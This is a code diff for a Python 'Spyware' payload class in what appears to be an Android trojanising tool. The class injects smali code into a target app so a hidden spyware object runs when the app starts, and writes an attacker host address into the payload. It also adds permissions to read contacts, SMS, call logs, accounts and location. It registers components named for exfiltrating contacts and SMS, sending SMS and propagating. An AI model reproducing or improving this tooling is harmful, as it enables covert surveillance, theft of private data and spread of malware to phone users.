@@ -44,8 +44,8 @@ class Spyware(Payload):
 
         with open(file_path, 'r') as file:
             for line in file:
-                # We ignore the abstract and static methods (we need to get
-                # an application context (this))
+                # Ignore 'abstract' and 'static' methods - need to get
+                # an application context (this)
                 if ((line.find(".method ") == 0) and
                     (line.find("abstract ") < 0) and
                     (line.find('static') < 0) and
@@ -80,38 +80,29 @@ class Spyware(Payload):
                     # We initialize our spyware class with an application
                     # context
                     buffer.append(
-                        "\tnew-instance {0},"
-                        " Landroid/spyware/Spyware;\n".format(valid_regs[0])
+                        "\tnew-instance {}, "
+                        "Landroid/spyware/Spyware;\n".format(valid_regs[0])
                     )
                     buffer.append(
-                        "\tinvoke-virtual {{p0}}, "
-                        "{0}->getApplicationContext()"
-                        "Landroid/content/Context;\n".format(data[0])
-                    )
-                    buffer.append(
-                        "\tmove-result-object {0}\n".format(valid_regs[1])
-                    )
-                    buffer.append(
-                        "\tinvoke-direct {{{0}, {1}}}, "
-                        "Landroid/spyware/Spyware;-><init>"
-                        "(Landroid/content/Context;)V\n".format(
-                            valid_regs[0], valid_regs[1]
-                        )
-                    )
-
-                    # We instantiate a spyware and hijack the app
-                    buffer.append(
-                        '\t.local {0}, '
-                        '"launcher":Landroid/spyware/Spyware;\n'.format(
+                        "\tinvoke-direct {{{}, p0}}, "
+                        "Landroid/spyware/Spyware;->"
+                        "<init>(Landroid/content/Context;)V\n".format(
                             valid_regs[0]
                         )
                     )
+
                     buffer.append(
-                        "\tinvoke-virtual {{{0}}}, "
+                        '\t.local {}, "spyware"'
+                        ':Landroid/spyware/Spyware;\n'.format(valid_regs[0])
+                    )
+
+                    buffer.append(
+                        "\tinvoke-virtual {{{}}}, "
                         "Landroid/spyware/Spyware;->run()V\n".format(
                             valid_regs[0]
                         )
                     )
+
                     buffer.append(line)
 
                 # Resetting the vars for the next method
@@ -130,9 +121,9 @@ class Spyware(Payload):
             for line in buffer:
                 file.write(line)
 
-    def set_payload_settings(self, payload_path):
+    def set_payload_settings(self):
         """
-        Add the rhost and ppg to the AndroidManifest.
+        Add the rhost and ppg value to Spyware.smali.
         """
         logging.info(
             "configuring the {} parameters...".format(
@@ -140,32 +131,33 @@ class Spyware(Payload):
             )
         )
 
-        files = os.listdir(payload_path)
+        buffer = []
+        spyware_path = os.path.join(
+            config.TMP_FOLDER,
+            os.path.splitext(self.app_name)[0], "android",
+            self.payload_name, "Spyware.smali"
+        )
 
-        for file in files:
-            buffer = []
-            file_path = os.path.join(payload_path, file)
+        with open(spyware_path, 'r') as file:
+            for line in file:
+                if (line.find("<RHOST>") >= 0):
+                    buffer.append(
+                        line.replace("<RHOST>", self.rhost)
+                    )
 
-            with open(file_path, 'r') as file:
-                for line in file:
-                    if (line.find("<--ATTACKER-->") >= 0):
+                elif (line.find("<PPG>") >= 0):
+                    if self.propagate:
                         buffer.append(
-                            line.replace("<--ATTACKER-->", self.rhost)
+                            line.replace("<PPG>", self.propagate)
                         )
 
-                    elif (line.find("<--PROPAGATE-->") >= 0):
-                        if self.propagate:
-                            buffer.append(
-                                line.replace("<--PROPAGATE-->", self.propagate)
-                            )
+                else:
+                    buffer.append(line)
 
-                    else:
-                        buffer.append(line)
-
-            # Overwritting the .smali file
-            with open(file_path, 'w') as file:
-                for line in buffer:
-                    file.write(line)
+        # Overwrite Spyware.smali
+        with open(spyware_path, 'w') as file:
+            for line in buffer:
+                file.write(line)
 
     # TODO: break this funtion in 3 parts - get AM, change AM, compile AM
     def get_updated_AndroidManifest(self):
@@ -253,98 +245,118 @@ class Spyware(Payload):
             for line in file:
                 if (line.find("<manifest ") >= 0):
                     buffer.append(line)
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'ACCESS_COARSE_LOCATION"/>\n'
+                        'ACCESS_COARSE_LOCATION" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'ACCESS_FINE_LOCATION"/>\n'
+                        'ACCESS_FINE_LOCATION" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'ACCESS_NETWORK_STATE"/>\n'
+                        'ACCESS_NETWORK_STATE" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'GET_ACCOUNTS"/>\n'
+                        'GET_ACCOUNTS" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'INTERNET"/>\n'
+                        'INTERNET" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'READ_CALL_LOG"/>\n'
+                        'READ_CALL_LOG" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'READ_CONTACTS"/>\n'
+                        'READ_CONTACTS" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'READ_PHONE_STATE"/>\n'
+                        'READ_PHONE_STATE" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'READ_SMS"/>\n'
+                        'READ_SMS" />\n'
                     )
+
                     buffer.append(
                         '\t<uses-permission '
                         'android:name="android.permission.'
-                        'RECEIVE_SMS"/>\n'
-                    )
-                    buffer.append(
-                        '\t<uses-permission '
-                        'android:name="android.permission.'
-                        'SEND_SMS"/>\n'
+                        'SEND_SMS" />\n'
                     )
 
                 elif (line.find("<application ") >= 0):
                     buffer.append(line)
+
                     buffer.append(
                         '\t<service '
-                        'android:name="android.spyware.'
-                        'PropagateS"/>\n'
+                        'android:name="android.spyware.services.'
+                        'PropagateS" />\n'
                     )
+
                     buffer.append(
                         '\t<service '
-                        'android:name="android.spyware.'
-                        'TrackerS"/>\n\n'
+                        'android:name="android.spyware.services.'
+                        'TrackerS" />\n\n'
                     )
 
                     buffer.append(
                         '\t<receiver '
-                        'android:name="android.spyware.'
+                        'android:name="android.spyware.receivers.'
+                        'ExfiltrateContactR" />\n'
+                    )
+
+                    buffer.append(
+                        '\t<receiver '
+                        'android:name="android.spyware.receivers.'
+                        'ExfiltrateZombieR" />\n'
+                    )
+
+                    buffer.append(
+                        '\t<receiver '
+                        'android:name="android.spyware.receivers.'
+                        'ExfiltrateSMSR" />\n'
+                    )
+
+                    buffer.append(
+                        '\t<receiver '
+                        'android:name="android.spyware.receivers.'
                         'SendSMSR">\n'
                     )
+
                     buffer.append('\t\t<intent-filter>\n')
+
                     buffer.append(
                         '\t\t\t<action '
                         'android:name="android.provider.'
-                        'Telephony.SMS_RECEIVED"/>\n'
+                        'Telephony.SMS_RECEIVED" />\n'
                     )
+
                     buffer.append('\t\t</intent-filter>\n')
+
                     buffer.append('\t</receiver>\n')
-                    buffer.append(
-                        '\t<receiver '
-                        'android:name="android.spyware.'
-                        'SendZombieR"/>\n'
-                    )
-                    buffer.append(
-                        '\t<receiver '
-                        'android:name="android.spyware.'
-                        'SpoofSMSR"/>\n\n'
-                    )
+
                 else:
                     buffer.append(line)
 
